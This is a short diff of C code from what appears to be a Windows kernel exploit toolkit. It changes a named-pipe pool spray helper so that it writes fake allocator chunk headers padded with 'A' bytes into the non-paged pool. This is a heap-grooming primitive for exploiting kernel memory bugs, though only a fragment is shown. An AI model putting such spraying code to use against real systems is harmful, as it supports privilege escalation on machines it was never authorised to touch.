@@ -64,9 +64,20 @@ int readDataFromPipe(pipe_pair_t* pipe_pair, char* out, size_t bufsize)
         NULL);
 }
 
-int AllocNPPNxChunk(pipe_pair_t* pipe, char* buffer, size_t bufsize)
+int AllocNPPNxChunk(pipe_pair_t* pipe, vs_chunk_t* chunk, size_t bufsize)
 {
-    return writeDataToPipe(pipe, buffer, bufsize);
+    char* temp_buffer = (char*)malloc(bufsize + 1);
+    memset(temp_buffer, 0x41, bufsize);
+    if (chunk) {
+        if (bufsize < sizeof(vs_chunk_t)) {
+            memcpy(temp_buffer, (char*)chunk, bufsize);
+        }
+        else {
+            memcpy(temp_buffer, (char*)chunk, sizeof(vs_chunk_t));
+        }
+
+    }
+    return writeDataToPipe(pipe, temp_buffer, bufsize);
 }
 
 int FreeNPPNxChunk(pipe_pair_t* pipe, size_t bufsize)
@@ -132,7 +143,7 @@ int PerformPipeSpray(pipe_spray_t* pipe_spray)
     for (size_t i = 0; i < pipe_spray->nb; i++)
     {
 
-        if (!AllocNPPNxChunk(&pipe_spray->pipes[i], pipe_spray->data_buf, pipe_spray->bufsize))
+        if (!writeDataToPipe(&pipe_spray->pipes[i], pipe_spray->data_buf, pipe_spray->bufsize))
         {
             fprintf(stderr, "[-] Failed to write in pipe at index %d\n", i);
             return 0;
